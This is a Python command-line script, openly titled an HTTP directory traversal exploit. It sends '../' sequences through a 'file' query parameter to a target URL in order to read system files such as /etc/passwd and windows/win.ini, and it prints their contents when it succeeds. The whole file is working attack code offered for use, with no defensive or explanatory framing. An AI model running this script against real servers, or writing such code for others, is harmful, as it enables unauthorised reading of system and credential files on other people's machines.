import argparse
import requests
import logging


def directory_traversal_attack(target_url, traversal_depth=5, sensitive_files=None):
    """
    Perform a directory traversal attack.
    :param target_url: Target URL.
    :param traversal_depth: Number of "../" sequences to inject.
    :param sensitive_files: List of sensitive files to attempt to access.
    """
    if sensitive_files is None:
        sensitive_files = ["etc/passwd", "windows/win.ini"]

    logging.info(f"Starting directory traversal attack on {target_url}")
    traversal = "../" * traversal_depth

    for sensitive_file in sensitive_files:
        payload = f"{traversal}{sensitive_file}"
        try:
            response = requests.get(target_url, params={"file": payload}, timeout=5)
            if response.status_code == 200 and "root" in response.text:
                logging.info(f"Sensitive file accessed: {sensitive_file}")
                return response.text
            else:
                logging.info(f"Failed to access: {sensitive_file}")
        except Exception as e:
            logging.error(f"Error accessing {sensitive_file}: {e}")

    return "Directory traversal attack failed."


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTTP Directory Traversal Exploit")
    parser.add_argument("--target", required=True, help="Target URL (e.g., http://example.com/vulnerable_endpoint)")
    parser.add_argument("--depth", type=int, default=5, help="Traversal depth (default: 5)")
    parser.add_argument("--files", nargs="+", help="Sensitive files to target (default: etc/passwd, windows/win.ini)")
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO)
    result = directory_traversal_attack(args.target, traversal_depth=args.depth, sensitive_files=args.files)
    print(result)
